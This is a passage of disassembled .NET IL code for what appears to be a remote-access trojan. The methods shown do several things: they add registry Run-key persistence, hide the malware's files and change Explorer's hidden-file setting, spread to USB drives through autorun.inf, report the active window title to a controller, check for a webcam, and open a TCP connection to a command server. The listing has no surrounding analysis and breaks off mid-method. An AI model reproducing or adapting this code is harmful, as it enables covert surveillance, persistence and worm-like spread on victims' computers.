      IL_01c7:  ldloc.s    V_6
      IL_01c9:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_01ce:  ldc.i4.0
      IL_01cf:  ble.s      IL_01ea

      IL_01d1:  ldarg.0
      IL_01d2:  ldstr      "act"
      IL_01d7:  ldarg.0
      IL_01d8:  ldfld      string k.OK::Y
      IL_01dd:  ldloc.s    V_6
      IL_01df:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_01e4:  callvirt   instance bool k.OK::Send(string)
      IL_01e9:  pop
      IL_01ea:  ldarg.0
      IL_01eb:  ldfld      bool k.OK::Isu
      IL_01f0:  brfalse    IL_0293

      .try
      {
        IL_01f5:  ldarg.0
        IL_01f6:  ldfld      class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer k.OK::F
        IL_01fb:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_0200:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
        IL_0205:  ldarg.0
        IL_0206:  ldfld      string k.OK::sf
        IL_020b:  ldc.i4.1
        IL_020c:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                    bool)
        IL_0211:  ldarg.0
        IL_0212:  ldfld      string k.OK::RG
        IL_0217:  ldstr      "\""
        IL_021c:  ldarg.0
        IL_021d:  ldfld      class [mscorlib]System.IO.FileInfo k.OK::LO
        IL_0222:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_0227:  ldstr      "\" .."
        IL_022c:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0231:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                           object)
        IL_0236:  leave.s    IL_0244

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0238:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_023d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0242:  leave.s    IL_0244

      }  // end handler
      .try
      {
        IL_0244:  ldarg.0
        IL_0245:  ldfld      class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer k.OK::F
        IL_024a:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_024f:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
        IL_0254:  ldarg.0
        IL_0255:  ldfld      string k.OK::sf
        IL_025a:  ldc.i4.1
        IL_025b:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                    bool)
        IL_0260:  ldarg.0
        IL_0261:  ldfld      string k.OK::RG
        IL_0266:  ldstr      "\""
        IL_026b:  ldarg.0
        IL_026c:  ldfld      class [mscorlib]System.IO.FileInfo k.OK::LO
        IL_0271:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_0276:  ldstr      "\" .."
        IL_027b:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0280:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                           object)
        IL_0285:  leave.s    IL_0293

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0287:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_028c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0291:  leave.s    IL_0293

      }  // end handler
      IL_0293:  ldarg.0
      IL_0294:  ldfld      bool k.OK::Spr
      IL_0299:  brfalse.s  IL_02a2

      IL_029b:  ldarg.0
      IL_029c:  ldc.i4.1
      IL_029d:  callvirt   instance void k.OK::USBspr(bool)
      IL_02a2:  ldarg.0
      IL_02a3:  ldfld      bool k.OK::Hid
      IL_02a8:  brfalse.s  IL_0326

      .try
      {
        IL_02aa:  ldarg.0
        IL_02ab:  ldfld      class [mscorlib]System.IO.FileInfo k.OK::LO
        IL_02b0:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_02b5:  ldc.i4.2
        IL_02b6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.FileSystem::SetAttr(string,
                                                                                                   valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.FileAttribute)
        IL_02bb:  leave.s    IL_02c9

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_02bd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_02c2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_02c7:  leave.s    IL_02c9

      }  // end handler
      .try
      {
        IL_02c9:  ldc.i4.7
        IL_02ca:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
        IL_02cf:  ldstr      "\\"
        IL_02d4:  ldarg.0
        IL_02d5:  ldfld      string k.OK::RG
        IL_02da:  ldstr      ".exe"
        IL_02df:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_02e4:  ldc.i4.2
        IL_02e5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.FileSystem::SetAttr(string,
                                                                                                   valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.FileAttribute)
        IL_02ea:  leave.s    IL_02f8

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_02ec:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_02f1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_02f6:  leave.s    IL_02f8

      }  // end handler
      .try
      {
        IL_02f8:  ldarg.0
        IL_02f9:  ldfld      class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer k.OK::F
        IL_02fe:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_0303:  ldstr      "HKEY_CURRENT_USER\\software\\Microsoft\\Windows\\Curre"
        + "ntVersion\\Explorer\\Advanced"
        IL_0308:  ldstr      "Hidden"
        IL_030d:  ldstr      "0"
        IL_0312:  ldc.i4.4
        IL_0313:  callvirt   instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::SetValue(string,
                                                                                                                           string,
                                                                                                                           object,
                                                                                                                           valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
        IL_0318:  leave.s    IL_0326

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_031a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_031f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0324:  leave.s    IL_0326

      }  // end handler
      IL_0326:  leave.s    IL_0334

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0328:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_032d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0332:  leave.s    IL_0334

    }  // end handler
    IL_0334:  br         IL_0165

    IL_0339:  ldarg.0
    IL_033a:  dup
    IL_033b:  ldvirtftn  instance void k.OK::RC()
    IL_0341:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                     native int)
    IL_0346:  ldc.i4.1
    IL_0347:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart,
                                                                                int32)
    IL_034c:  stloc.s    V_8
    IL_034e:  ldloc.s    V_8
    IL_0350:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
    IL_0355:  ldc.i4.0
    IL_0356:  stloc.s    V_7
    IL_0358:  ldc.i4     0x3e8
    IL_035d:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    .try
    {
      IL_0362:  ldloc.s    V_7
      IL_0364:  ldc.i4.8
      IL_0365:  bne.un.s   IL_0395

      IL_0367:  ldc.i4.0
      IL_0368:  stloc.s    V_7
      IL_036a:  ldarg.0
      IL_036b:  callvirt   instance string k.OK::ACT()
      IL_0370:  stloc.s    V_9
      IL_0372:  ldloc.s    V_9
      IL_0374:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0379:  ldc.i4.0
      IL_037a:  ble.s      IL_0395

      IL_037c:  ldarg.0
      IL_037d:  ldstr      "act"
      IL_0382:  ldarg.0
      IL_0383:  ldfld      string k.OK::Y
      IL_0388:  ldloc.s    V_9
      IL_038a:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_038f:  callvirt   instance bool k.OK::Send(string)
      IL_0394:  pop
      IL_0395:  leave.s    IL_03a3

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0397:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_039c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_03a1:  leave.s    IL_03a3

    }  // end handler
    IL_03a3:  br.s       IL_0358
  } // end of method OK::ko

  .method public instance void  USBspr(bool use) cil managed noinlining nooptimization
  {
    // Code size       462 (0x1ce)
    .maxstack  6
    .locals init (string[] V_0,
             class [mscorlib]System.IO.DriveInfo V_1,
             int32 V_2,
             string[] V_3,
             class [mscorlib]System.IO.DriveInfo V_4,
             int32 V_5,
             int32 V_6,
             string[] V_7,
             int32 V_8)
    .try
    {
      IL_0000:  ldarg.1
      IL_0001:  brfalse    IL_0108

      IL_0006:  call       string[] [mscorlib]System.Environment::GetLogicalDrives()
      IL_000b:  stloc.0
      IL_000c:  ldc.i4.0
      IL_000d:  ldloc.0
      IL_000e:  ldlen
      IL_000f:  conv.ovf.i4
      IL_0010:  ldc.i4.1
      IL_0011:  sub.ovf
      IL_0012:  stloc.s    V_6
      IL_0014:  stloc.2
      IL_0015:  br         IL_00fb

      IL_001a:  ldloc.0
      IL_001b:  ldloc.2
      IL_001c:  ldelem.ref
      IL_001d:  newobj     instance void [mscorlib]System.IO.DriveInfo::.ctor(string)
      IL_0022:  stloc.1
      IL_0023:  ldloc.1
      IL_0024:  callvirt   instance valuetype [mscorlib]System.IO.DriveType [mscorlib]System.IO.DriveInfo::get_DriveType()
      IL_0029:  ldc.i4.2
      IL_002a:  bne.un     IL_00f7

      IL_002f:  ldloc.1
      IL_0030:  callvirt   instance bool [mscorlib]System.IO.DriveInfo::get_IsReady()
      IL_0035:  brfalse    IL_00f7

      IL_003a:  ldloc.0
      IL_003b:  ldloc.2
      IL_003c:  ldelem.ref
      IL_003d:  ldarg.0
      IL_003e:  ldfld      string k.OK::RG
      IL_0043:  ldstr      ".exe"
      IL_0048:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_004d:  call       bool [mscorlib]System.IO.File::Exists(string)
      IL_0052:  brtrue     IL_00f7

      IL_0057:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
      IL_005c:  ldloc.0
      IL_005d:  ldloc.2
      IL_005e:  ldelem.ref
      IL_005f:  ldarg.0
      IL_0060:  ldfld      string k.OK::RG
      IL_0065:  ldstr      ".exe"
      IL_006a:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_006f:  ldc.i4.1
      IL_0070:  call       void [mscorlib]System.IO.File::Copy(string,
                                                               string,
                                                               bool)
      IL_0075:  call       class k.My.MyComputer k.My.MyProject::get_Computer()
      IL_007a:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
      IL_007f:  ldloc.0
      IL_0080:  ldloc.2
      IL_0081:  ldelem.ref
      IL_0082:  ldstr      "autorun.inf"
      IL_0087:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_008c:  ldc.i4.5
      IL_008d:  newarr     [mscorlib]System.String
      IL_0092:  stloc.s    V_7
      IL_0094:  ldloc.s    V_7
      IL_0096:  ldc.i4.0
      IL_0097:  ldstr      "[autorun]\r\nopen="
      IL_009c:  stelem.ref
      IL_009d:  ldloc.s    V_7
      IL_009f:  ldc.i4.1
      IL_00a0:  ldloc.0
      IL_00a1:  ldloc.2
      IL_00a2:  ldelem.ref
      IL_00a3:  stelem.ref
      IL_00a4:  ldloc.s    V_7
      IL_00a6:  ldc.i4.2
      IL_00a7:  ldarg.0
      IL_00a8:  ldfld      string k.OK::RG
      IL_00ad:  stelem.ref
      IL_00ae:  ldloc.s    V_7
      IL_00b0:  ldc.i4.3
      IL_00b1:  ldstr      ".exe\r\nshellexecute="
      IL_00b6:  stelem.ref
      IL_00b7:  ldloc.s    V_7
      IL_00b9:  ldc.i4.4
      IL_00ba:  ldloc.0
      IL_00bb:  ldloc.2
      IL_00bc:  ldelem.ref
      IL_00bd:  stelem.ref
      IL_00be:  ldloc.s    V_7
      IL_00c0:  call       string [mscorlib]System.String::Concat(string[])
      IL_00c5:  ldc.i4.1
      IL_00c6:  callvirt   instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::WriteAllText(string,
                                                                                                                               string,
                                                                                                                               bool)
      IL_00cb:  ldloc.0
      IL_00cc:  ldloc.2
      IL_00cd:  ldelem.ref
      IL_00ce:  ldarg.0
      IL_00cf:  ldfld      string k.OK::RG
      IL_00d4:  ldstr      ".exe"
      IL_00d9:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00de:  ldc.i4.2
      IL_00df:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.FileSystem::SetAttr(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.FileAttribute)
      IL_00e4:  ldloc.0
      IL_00e5:  ldloc.2
      IL_00e6:  ldelem.ref
      IL_00e7:  ldstr      "autorun.inf"
      IL_00ec:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_00f1:  ldc.i4.2
      IL_00f2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.FileSystem::SetAttr(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.FileAttribute)
      IL_00f7:  ldloc.2
      IL_00f8:  ldc.i4.1
      IL_00f9:  add.ovf
      IL_00fa:  stloc.2
      IL_00fb:  ldloc.2
      IL_00fc:  ldloc.s    V_6
      IL_00fe:  ble        IL_001a

      IL_0103:  leave      IL_01cd

      IL_0108:  call       string[] [mscorlib]System.Environment::GetLogicalDrives()
      IL_010d:  stloc.3
      IL_010e:  ldc.i4.0
      IL_010f:  ldloc.3
      IL_0110:  ldlen
      IL_0111:  conv.ovf.i4
      IL_0112:  ldc.i4.1
      IL_0113:  sub.ovf
      IL_0114:  stloc.s    V_8
      IL_0116:  stloc.s    V_5
      IL_0118:  br         IL_01b6

      IL_011d:  ldloc.3
      IL_011e:  ldloc.s    V_5
      IL_0120:  ldelem.ref
      IL_0121:  newobj     instance void [mscorlib]System.IO.DriveInfo::.ctor(string)
      IL_0126:  stloc.s    V_4
      IL_0128:  ldloc.s    V_4
      IL_012a:  callvirt   instance valuetype [mscorlib]System.IO.DriveType [mscorlib]System.IO.DriveInfo::get_DriveType()
      IL_012f:  ldc.i4.2
      IL_0130:  bne.un.s   IL_01b0

      IL_0132:  ldloc.s    V_4
      IL_0134:  callvirt   instance bool [mscorlib]System.IO.DriveInfo::get_IsReady()
      IL_0139:  brfalse.s  IL_01b0

      IL_013b:  ldloc.3
      IL_013c:  ldloc.s    V_5
      IL_013e:  ldelem.ref
      IL_013f:  ldarg.0
      IL_0140:  ldfld      string k.OK::RG
      IL_0145:  ldstr      ".exe"
      IL_014a:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_014f:  call       bool [mscorlib]System.IO.File::Exists(string)
      IL_0154:  brfalse.s  IL_01b0

      IL_0156:  ldloc.3
      IL_0157:  ldloc.s    V_5
      IL_0159:  ldelem.ref
      IL_015a:  ldarg.0
      IL_015b:  ldfld      string k.OK::RG
      IL_0160:  ldstr      ".exe"
      IL_0165:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_016a:  ldc.i4.0
      IL_016b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.FileSystem::SetAttr(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.FileAttribute)
      IL_0170:  ldloc.3
      IL_0171:  ldloc.s    V_5
      IL_0173:  ldelem.ref
      IL_0174:  ldstr      "autorun.inf"
      IL_0179:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_017e:  ldc.i4.0
      IL_017f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.FileSystem::SetAttr(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.FileAttribute)
      IL_0184:  ldloc.3
      IL_0185:  ldloc.s    V_5
      IL_0187:  ldelem.ref
      IL_0188:  ldarg.0
      IL_0189:  ldfld      string k.OK::RG
      IL_018e:  ldstr      ".exe"
      IL_0193:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0198:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_019d:  ldloc.3
      IL_019e:  ldloc.s    V_5
      IL_01a0:  ldelem.ref
      IL_01a1:  ldstr      "autorun.inf"
      IL_01a6:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_01ab:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_01b0:  ldloc.s    V_5
      IL_01b2:  ldc.i4.1
      IL_01b3:  add.ovf
      IL_01b4:  stloc.s    V_5
      IL_01b6:  ldloc.s    V_5
      IL_01b8:  ldloc.s    V_8
      IL_01ba:  ble        IL_011d

      IL_01bf:  leave.s    IL_01cd

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01c1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01c6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01cb:  leave.s    IL_01cd

    }  // end handler
    IL_01cd:  ret
  } // end of method OK::USBspr

  .method public instance string  ACT() cil managed
  {
    // Code size       94 (0x5e)
    .maxstack  3
    .locals init (string V_0,
             string V_1,
             native int V_2,
             string V_3)
    .try
    {
      IL_0000:  call       native int k.OK::GetForegroundWindow()
      IL_0005:  stloc.2
      IL_0006:  ldloc.2
      IL_0007:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_000c:  call       bool [mscorlib]System.IntPtr::op_Equality(native int,
                                                                     native int)
      IL_0011:  brfalse.s  IL_001b

      IL_0013:  ldstr      ""
      IL_0018:  stloc.0
      IL_0019:  leave.s    IL_005c

      IL_001b:  ldloc.2
      IL_001c:  call       int64 [mscorlib]System.IntPtr::op_Explicit(native int)
      IL_0021:  call       int32 k.OK::GetWindowTextLength(int64)
      IL_0026:  ldc.i4.1
      IL_0027:  add.ovf
      IL_0028:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Space(int32)
      IL_002d:  stloc.3
      IL_002e:  ldloc.2
      IL_002f:  ldloca.s   V_3
      IL_0031:  ldloc.3
      IL_0032:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0037:  call       int32 k.OK::GetWindowText(native int,
                                                     string&,
                                                     int32)
      IL_003c:  pop
      IL_003d:  ldarg.0
      IL_003e:  ldloca.s   V_3
      IL_0040:  callvirt   instance string k.OK::ENB(string&)
      IL_0045:  stloc.1
      IL_0046:  leave.s    IL_005a

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0048:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_004d:  ldstr      ""
      IL_0052:  stloc.1
      IL_0053:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0058:  leave.s    IL_005a

    }  // end handler
    IL_005a:  ldloc.1
    IL_005b:  ret

    IL_005c:  ldloc.0
    IL_005d:  ret
  } // end of method OK::ACT

  .method public instance string  BS(uint8[]& B) cil managed
  {
    // Code size       13 (0xd)
    .maxstack  2
    .locals init (string V_0)
    IL_0000:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_UTF8()
    IL_0005:  ldarg.1
    IL_0006:  ldind.ref
    IL_0007:  callvirt   instance string [mscorlib]System.Text.Encoding::GetString(uint8[])
    IL_000c:  ret
  } // end of method OK::BS

  .method public instance bool  Cam() cil managed
  {
    // Code size       59 (0x3b)
    .maxstack  5
    .locals init (bool V_0,
             int32 V_1,
             string V_2,
             string V_3)
    .try
    {
      IL_0000:  ldc.i4.0
      IL_0001:  stloc.1
      IL_0002:  ldloc.1
      IL_0003:  conv.ovf.i2
      IL_0004:  ldc.i4.s   100
      IL_0006:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Space(int32)
      IL_000b:  stloc.2
      IL_000c:  ldloca.s   V_2
      IL_000e:  ldc.i4.s   100
      IL_0010:  ldnull
      IL_0011:  stloc.3
      IL_0012:  ldloca.s   V_3
      IL_0014:  ldc.i4.s   100
      IL_0016:  call       bool k.OK::capGetDriverDescriptionA(int16,
                                                               string&,
                                                               int32,
                                                               string&,
                                                               int32)
      IL_001b:  brfalse.s  IL_0021

      IL_001d:  ldc.i4.1
      IL_001e:  stloc.0
      IL_001f:  leave.s    IL_0039

      IL_0021:  ldloc.1
      IL_0022:  ldc.i4.1
      IL_0023:  add.ovf
      IL_0024:  stloc.1
      IL_0025:  ldloc.1
      IL_0026:  ldc.i4.4
      IL_0027:  ble.s      IL_0002

      IL_0029:  leave.s    IL_0037

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_002b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0030:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0035:  leave.s    IL_0037

    }  // end handler
    IL_0037:  ldc.i4.0
    IL_0038:  ret

    IL_0039:  ldloc.0
    IL_003a:  ret
  } // end of method OK::Cam

  .method public instance bool  CompDir(class [mscorlib]System.IO.FileInfo F1,
                                        class [mscorlib]System.IO.FileInfo F2) cil managed
  {
    // Code size       115 (0x73)
    .maxstack  3
    .locals init (bool V_0,
             class [mscorlib]System.IO.DirectoryInfo V_1,
             class [mscorlib]System.IO.DirectoryInfo V_2)
    IL_0000:  ldarg.1
    IL_0001:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
    IL_0006:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_000b:  ldarg.2
    IL_000c:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
    IL_0011:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0016:  ldc.i4.0
    IL_0017:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_001c:  ldc.i4.0
    IL_001d:  bne.un.s   IL_0071

    IL_001f:  ldarg.1
    IL_0020:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.FileInfo::get_Directory()
    IL_0025:  stloc.1
    IL_0026:  ldarg.2
    IL_0027:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.FileInfo::get_Directory()
    IL_002c:  stloc.2
    IL_002d:  ldloc.1
    IL_002e:  callvirt   instance string [mscorlib]System.IO.DirectoryInfo::get_Name()
    IL_0033:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0038:  ldloc.2
    IL_0039:  callvirt   instance string [mscorlib]System.IO.DirectoryInfo::get_Name()
    IL_003e:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0043:  ldc.i4.0
    IL_0044:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_0049:  ldc.i4.0
    IL_004a:  beq.s      IL_004e

    IL_004c:  ldc.i4.0
    IL_004d:  ret

    IL_004e:  ldloc.1
    IL_004f:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.DirectoryInfo::get_Parent()
    IL_0054:  stloc.1
    IL_0055:  ldloc.2
    IL_0056:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.DirectoryInfo::get_Parent()
    IL_005b:  stloc.2
    IL_005c:  ldloc.1
    IL_005d:  ldnull
    IL_005e:  ceq
    IL_0060:  ldloc.2
    IL_0061:  ldnull
    IL_0062:  ceq
    IL_0064:  and
    IL_0065:  brfalse.s  IL_0069

    IL_0067:  ldc.i4.1
    IL_0068:  ret

    IL_0069:  ldloc.1
    IL_006a:  brtrue.s   IL_006e

    IL_006c:  ldc.i4.0
    IL_006d:  ret

    IL_006e:  ldloc.2
    IL_006f:  brtrue.s   IL_002d

    IL_0071:  ldc.i4.0
    IL_0072:  ret
  } // end of method OK::CompDir

  .method public instance bool  connect() cil managed
  {
    // Code size       668 (0x29c)
    .maxstack  5
    .locals init (bool V_0,
             class [mscorlib]System.IO.FileInfo V_1,
             string V_2,
             class [mscorlib]System.IO.FileInfo V_3,
             string V_4,
             string[] V_5)
    IL_0000:  ldarg.0
    IL_0001:  ldc.i4.0
    IL_0002:  stfld      bool k.OK::Cn
    IL_0007:  ldc.i4     0x7d0
    IL_000c:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_0011:  ldarg.0
    IL_0012:  ldfld      class [mscorlib]System.IO.FileInfo k.OK::LO
    IL_0017:  stloc.1
    IL_0018:  ldloc.1
    IL_0019:  stloc.3
    IL_001a:  ldloc.3
    IL_001b:  call       void [mscorlib]System.Threading.Monitor::Enter(object)
    .try
    {
      .try
      {
        IL_0020:  ldarg.0
        IL_0021:  ldfld      class [System]System.Net.Sockets.TcpClient k.OK::C
        IL_0026:  brfalse.s  IL_0048

        .try
        {
          IL_0028:  ldarg.0
          IL_0029:  ldfld      class [System]System.Net.Sockets.TcpClient k.OK::C
          IL_002e:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Close()
          IL_0033:  ldarg.0
          IL_0034:  ldnull
          IL_0035:  stfld      class [System]System.Net.Sockets.TcpClient k.OK::C
          IL_003a:  leave.s    IL_0048

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_003c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0041:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0046:  leave.s    IL_0048

        }  // end handler
        .try
        {
          IL_0048:  ldarg.0
          IL_0049:  ldfld      class [mscorlib]System.IO.MemoryStream k.OK::MeM
          IL_004e:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
          IL_0053:  leave.s    IL_006d

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_0055:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_005a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_005f:  leave.s    IL_006d

        }  // end handler
      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0061:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0066:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_006b:  leave.s    IL_006d

      }  // end handler
      .try
      {
        IL_006d:  ldarg.0
        IL_006e:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_0073:  stfld      class [mscorlib]System.IO.MemoryStream k.OK::MeM
        IL_0078:  ldarg.0
        IL_0079:  newobj     instance void [System]System.Net.Sockets.TcpClient::.ctor()
        IL_007e:  stfld      class [System]System.Net.Sockets.TcpClient k.OK::C
        IL_0083:  ldarg.0
        IL_0084:  ldfld      class [System]System.Net.Sockets.TcpClient k.OK::C
        IL_0089:  ldc.i4     0x32000
        IL_008e:  callvirt   instance void [System]System.Net.Sockets.TcpClient::set_ReceiveBufferSize(int32)
        IL_0093:  ldarg.0
